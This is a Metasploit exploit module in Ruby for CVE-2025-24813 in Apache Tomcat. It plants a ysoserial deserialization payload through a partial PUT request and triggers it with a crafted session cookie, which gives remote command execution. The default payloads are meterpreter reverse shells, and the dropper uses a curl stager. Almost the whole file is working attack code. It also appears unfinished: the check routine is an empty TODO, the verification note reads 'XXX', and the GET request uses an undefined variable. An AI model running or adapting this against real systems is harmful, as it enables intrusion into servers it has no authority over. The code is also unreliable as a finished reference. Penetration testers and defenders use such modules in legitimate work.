##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::JavaDeserialization

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Tomcat Partial PUT Java Deserialization',
        'Description' => %q{
          This module exploits a Java deserialization vulnerability in Apache
          Tomcats's session restoration functionality that can be exploited with a partial PUT
          to place an attacker controlled deserialisazion payload in the work directory.

          For the exploit to succeed, writes must be enabled for the default servlet,
          and org.apache.catalina.session.PersistentManager must be configured to use
          org.apache.catalina.session.FileStore.

          Verified working on XXX
        },
        'Author' => [
          'sw0rd1ight', # Discovery
          'Calum Hutton', # Exploit
        ],
        'References' => [
          ['CVE', '2025-24813'],
          ['URL', 'https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2025-24813'],
        ],
        'DisclosureDate' => '2025-03-10', # Vendor release note
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux', 'win'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'DefaultOptions' => {
                'CMDSTAGER::FLAVOR' => :curl,
                'PAYLOAD' => 'linux/x64/meterpreter_reverse_https'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :windows_cmd,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp' }
            }
          ],
          [
            'Windows Dropper',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :windows_dropper,
              'DefaultOptions' => { 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' }
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('GADGET', [true, 'ysoserial gadget', 'CommonsBeanutils1']),
    ])
  end

  def check
    # TODO
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd, :windows_cmd
      execute_command(payload.encoded)
    when :linux_dropper, :windows_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, _opts = {})
    # Determine the shell
    case target['Platform']
    when 'unix', 'linux'
      shell = 'bash'
    when 'win'
      shell = 'cmd'
    else
      fail_with(Failure::NoTarget, 'Unsupported target platform!')
    end

    vprint_status("Utilizing #{datastore['GADGET']} deserialization chain")
    session_id = Rex::Text.rand_text_alpha(10)
    session_file = "#{session_id}.session"
    vprint_status("Uploading ysoserial payload (#{session_file}) via partial PUT")
    res = send_partial_put(
      generate_java_deserialization_for_command(datastore['GADGET'].to_s, shell, cmd),
      session_file
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "Failed to upload payload: #{res.code}")
    end

    # Request the session id to retrieve the file and trigger deserialization
    request = {
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path),
      'headers' => { 'Cookie' => "JSESSIONID=.#{session_id}" },
      'data' => data
    }

    res = send_request_cgi(request)

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "Failed to restore session: #{res.code}")
    end

    print_good("Successfully executed command: #{cmd}")
  end

  def send_partial_put(data, name)
    request = {
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, name),
      'ctype' => 'application/octet-stream',
      'headers' => { 'Content-Range' => 'bytes 0-5/100' },
      'data' => data
    }
    send_request_cgi(request)
  end

end
